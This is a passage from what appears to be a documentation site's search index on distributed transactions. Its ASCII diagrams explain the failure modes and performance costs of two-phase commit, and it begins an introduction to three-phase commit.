\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Chooses Consistency over           \u2502            \u2502\n\u2502    \u2502   Availability                       \u2502            \u2502\n\u2502    \u2502 \u2022 Network partition blocks progress  \u2502            \u2502\n\u2502    \u2502 \u2022 Cannot tolerate partition          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c LOGGING OVERHEAD                                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Multiple durable writes required   \u2502            \u2502\n\u2502    \u2502 \u2022 Coordinator log + participant logs \u2502            \u2502\n\u2502    \u2502 \u2022 Disk I/O latency                   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#65-problems-in-two-phase-commit","title":"6.5 Problems in Two-Phase Commit","text":"<p>Problem 1: Coordinator Failure (Blocking)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 1: COORDINATOR FAILURE                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Coordinator crashes after receiving votes    \u2502\n\u2502           but before sending decision                   \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                                \u2502\n\u2502 t1    Coordinator sends PREPARE                         \u2502\n\u2502 t2    Participants vote YES                             \u2502\n\u2502 t3    \ud83d\udca5 COORDINATOR CRASHES \ud83d\udca5                         \u2502\n\u2502       (Decision not yet sent!)                          \u2502\n\u2502                                                         \u2502\n\u2502 Result:                                                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Participants are BLOCKED in READY state  \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot commit (no decision received)   \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot abort (might be only failure)   \u2502           \u2502\n\u2502 \u2502 \u2022 Hold locks indefinitely                \u2502           \u2502\n\u2502 \u2502 \u2022 System unavailable                     \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Why participants can't decide:                          \u2502\n\u2502 \u2022 If they commit and coordinator decided abort:         \u2502\n\u2502   \u2192 Inconsistency! \u274c                                   \u2502\n\u2502 \u2022 If they abort and coordinator decided commit:         \u2502\n\u2502   \u2192 Inconsistency! \u274c                                   \u2502\n\u2502 \u2022 Must wait for coordinator recovery                    \u2502\n\u2502                                                         \u2502\n\u2502 Impact:                                                 \u2502\n\u2502 \u2022 Locks held \u2192 Other transactions blocked               \u2502\n\u2502 \u2022 Resources unavailable                                 \u2502\n\u2502 \u2022 Cascading delays                                      \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 2: Participant Failure After Voting YES</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    PROBLEM 2: PARTICIPANT FAILURE AFTER YES VOTE        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Participant crashes after voting YES         \u2502\n\u2502           but before receiving decision                 \u2502\n\u2502                                                         \u2502\n\u2502 Timeline:                                               \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                                \u2502\n\u2502 t1    Participant A votes YES                           \u2502\n\u2502 t2    \ud83d\udca5 PARTICIPANT A CRASHES \ud83d\udca5                       \u2502\n\u2502 t3    Coordinator sends COMMIT                          \u2502\n\u2502 t4    Participant A recovers...                         \u2502\n\u2502                                                         \u2502\n\u2502 Problem:                                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Participant A doesn't know outcome:      \u2502           \u2502\n\u2502 \u2502 \u2022 Voted YES (logged)                     \u2502           \u2502\n\u2502 \u2502 \u2022 Never received decision                \u2502           \u2502\n\u2502 \u2502 \u2022 Cannot commit or abort independently   \u2502           \u2502\n\u2502 \u2502 \u2022 Must contact coordinator               \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Recovery:                                               \u2502\n\u2502 \u2022 Read log: \"Voted YES for TXN-123\"                     \u2502\n\u2502 \u2022 Contact coordinator: \"What happened to TXN-123?\"      \u2502\n\u2502 \u2022 Coordinator responds: \"COMMIT\" or \"ABORT\"             \u2502\n\u2502 \u2022 Apply decision                                        \u2502\n\u2502                                                         \u2502\n\u2502 If coordinator also crashed:                            \u2502\n\u2502 \u2192 BLOCKED until coordinator recovers! \u274c                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 3: Network Partition</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 3: NETWORK PARTITION                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Network partition splits coordinator and     \u2502\n\u2502           participants                                  \u2502\n\u2502                                                         \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571                  \u2502\n\u2502    \u2502 Coordinator  \u2502        Network Partition            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571                  \u2502\n\u2502          \u2502                                              \u2502\n\u2502          \u2502 PREPARE? (sent)                              \u2502\n\u2502          \u2502 (message lost!)                              \u2502\n\u2502          \u25bc                                              \u2502\n\u2502    \u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571\u2571                                          \u2502\n\u2502                                                         \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u2502\n\u2502    \u2502Participant A \u2502       \u2502Participant B \u2502             \u2502\n\u2502    \u2502(unreachable) \u2502       \u2502(unreachable) \u2502             \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518             \u2502\n\u2502                                                         \u2502\n\u2502 Impact:                                                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Coordinator times out waiting for votes\u2502           \u2502\n\u2502 \u2502 \u2022 Decides to ABORT (safety)              \u2502           \u2502\n\u2502 \u2502 \u2022 But cannot reach participants!         \u2502           \u2502\n\u2502 \u2502 \u2022 Participants waiting indefinitely      \u2502           \u2502\n\u2502 \u2502 \u2022 System split-brain risk                \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 When partition heals:                                   \u2502\n\u2502 \u2022 Messages finally delivered                            \u2502\n\u2502 \u2022 But significant delay occurred                        \u2502\n\u2502 \u2022 Locks held for extended period                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 4: Heuristic Decisions (Manual Intervention)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 4: HEURISTIC DECISIONS                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Administrator manually commits/aborts        \u2502\n\u2502           to unblock system                             \u2502\n\u2502                                                         \u2502\n\u2502 Situation:                                              \u2502\n\u2502 \u2022 Coordinator crashed and not recovering                \u2502\n\u2502 \u2022 Participants blocked for hours                        \u2502\n\u2502 \u2022 Critical system unavailable                           \u2502\n\u2502 \u2022 DBA intervenes manually                               \u2502\n\u2502                                                         \u2502\n\u2502 DBA Action:                                             \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Participant A: FORCE COMMIT               \u2502           \u2502\n\u2502 \u2502 Participant B: FORCE ABORT                \u2502           \u2502\n\u2502 \u2502 (Different decisions! \ud83d\ude31)                 \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Result: INCONSISTENCY!                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Database inconsistent across nodes     \u2502           \u2502\n\u2502 \u2502 \u2022 Data integrity violated                \u2502           \u2502\n\u2502 \u2502 \u2022 Extremely difficult to fix             \u2502           \u2502\n\u2502 \u2502 \u2022 May require manual reconciliation      \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Heuristic outcomes:                                     \u2502\n\u2502 \u2022 Heuristic Commit: Force commit locally                \u2502\n\u2502 \u2022 Heuristic Abort: Force abort locally                  \u2502\n\u2502 \u2022 Heuristic Mixed: Some commit, some abort \u274c           \u2502\n\u2502                                                         \u2502\n\u2502 This is why 2PC is called \"blocking\" protocol          \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 5: Performance Degradation</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 5: PERFORMANCE ISSUES                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Message Overhead:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 For N participants:                      \u2502           \u2502\n\u2502 \u2502 \u2022 PREPARE messages: N                    \u2502           \u2502\n\u2502 \u2502 \u2022 Vote responses: N                      \u2502           \u2502\n\u2502 \u2502 \u2022 COMMIT/ABORT messages: N               \u2502           \u2502\n\u2502 \u2502 \u2022 ACK responses: N                       \u2502           \u2502\n\u2502 \u2502 Total: 4N messages (synchronous)         \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Latency Analysis:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Local transaction:  1-10 ms              \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 2PC transaction:                         \u2502           \u2502\n\u2502 \u2502 \u2022 Network RTT (\u00d74): 4 \u00d7 5ms = 20ms       \u2502           \u2502\n\u2502 \u2502 \u2022 Logging (\u00d76):     6 \u00d7 2ms = 12ms       \u2502           \u2502\n\u2502 \u2502 \u2022 Processing:              3ms           \u2502           \u2502\n\u2502 \u2502 Total:                   ~35ms           \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 \u2192 3-35x slower! \ud83d\udcc9                       \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Throughput Impact:                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Locks held for 35ms (vs 1ms local)       \u2502           \u2502\n\u2502 \u2502 \u2192 35x longer lock duration               \u2502           \u2502\n\u2502 \u2502 \u2192 97% reduction in concurrent capacity   \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Summary: When 2PC Fails</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         WHEN TWO-PHASE COMMIT FAILS                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 \u274c Coordinator crash \u2192 Blocking                         \u2502\n\u2502 \u274c Participant crash after YES \u2192 Uncertainty            \u2502\n\u2502 \u274c Network partition \u2192 Split-brain risk                 \u2502\n\u2502 \u274c Multiple failures \u2192 Indefinite blocking              \u2502\n\u2502 \u274c Heuristic decisions \u2192 Inconsistency                  \u2502\n\u2502 \u274c High latency \u2192 Poor performance                      \u2502\n\u2502 \u274c Many participants \u2192 Exponential failure probability  \u2502\n\u2502                                                         \u2502\n\u2502 Key Limitation:                                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 2PC is a BLOCKING protocol               \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 Availability is sacrificed for           \u2502           \u2502\n\u2502 \u2502 Consistency (CAP theorem)                \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Modern alternatives:                                    \u2502\n\u2502 \u2022 Three-Phase Commit (3PC) - Non-blocking               \u2502\n\u2502 \u2022 Paxos/Raft - Consensus protocols                      \u2502\n\u2502 \u2022 Saga pattern - Eventual consistency                   \u2502\n\u2502 \u2022 Event sourcing - Asynchronous                         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#66-three-phase-commit-3pc-protocol","title":"6.6 Three-Phase Commit (3PC) Protocol","text":"<p>Description:</p> <p>Three-Phase Commit (3PC) is a non-blocking atomic commitment protocol designed to solve the blocking problem of Two-Phase Commit (2PC). Developed by Dale Skeen in his 1981 doctoral dissertation at UC Berkeley, 3PC introduces an additional phase between the voting and commit phases to prevent participants from blocking when the coordinator fails.</p> <p>The Core Innovation:</p> <p>While 2PC can block when the coordinator crashes after participants vote YES, 3PC adds a PreCommit phase that allows participants to distinguish between \"transaction will definitely abort\" and \"transaction might commit.\" This enables participants to make progress even if the coordinator fails.</p> <p>Why 3PC Was Created:</p> <p>The fundamental problem with 2PC is that participants enter an uncertain state after voting YES: - They don't know if coordinator received their vote - They don't know if other participants voted YES - They don't know the final decision - They cannot abort (might be only failure) - They cannot commit (others might have voted NO) - Result: BLOCKED indefinitely \u274c</p> <p>3PC solves this by ensuring participants always know whether the transaction can still abort or must eventually commit.</p> <p>Historical Context:</p> 